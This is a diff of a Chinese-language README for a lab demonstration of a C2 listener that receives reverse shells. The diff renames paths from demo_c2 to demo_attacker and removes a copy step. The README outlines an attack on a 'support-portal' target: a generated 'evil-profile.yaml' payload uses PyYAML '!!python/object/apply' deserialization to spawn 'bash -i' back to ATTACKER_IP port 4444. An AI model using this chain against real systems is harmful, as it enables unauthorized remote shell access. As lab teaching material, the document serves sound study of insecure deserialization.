@@ -1,4 +1,4 @@
-# demo_c2 — 实验演示 C2 监听器
+# demo_attacker — 实验演示 C2 监听器
 
 > **仅用于实验环境。** 这是用于演示反弹 shell 的受控接收端。
 > 它不转发命令、不转发会话、也不接受任何远程输入。
@@ -7,8 +7,6 @@
 ## 快速开始（demo-attacker）
 
 ```bash
-# 将监听器复制到 demo-attacker（或直接在本仓库中运行）
-scp demo_c2/listener.py user@demo-attacker:/opt/demo-c2/listener.py
 
 # 在终端中手动运行——保持开启以等待反弹 shell 连入
 python3 listener.py
@@ -23,7 +21,7 @@ python3 listener.py
 ### 前置条件
 
 - demo-server 运行 support-portal（`TARGET=$VICTIM_IP:8080`）
-- demo-attacker 运行 `demo_c2/listener.py`
+- demo-attacker 运行 `demo_attacker/listener.py`
 - Python 3.10+、curl、（可选）nmap
 
 先导出两台机器的 IP，后续命令即可直接复制粘贴：
@@ -38,7 +36,7 @@ export ATTACKER_IP=<demo-attacker-ip> # 例如 192.168.56.20
 #### 0. 准备载荷文件
 
 ```bash
-cd demo_c2/attack/
+cd demo_attacker/attack/
 
 # 生成 evil-profile.yaml（反弹 shell 载荷）
 ./generate-evil-profile.sh $ATTACKER_IP 4444
@@ -105,7 +103,7 @@ PyYAML 反序列化 `!!python/object/apply` → 派生 `bash -i` → 回连
 
 #### 12. 在 C2 上交互
 
-在运行 `demo_c2/listener.py` 的终端中：
+在运行 `demo_attacker/listener.py` 的终端中：
 
 ```text
 [demo-c2] Connection received.
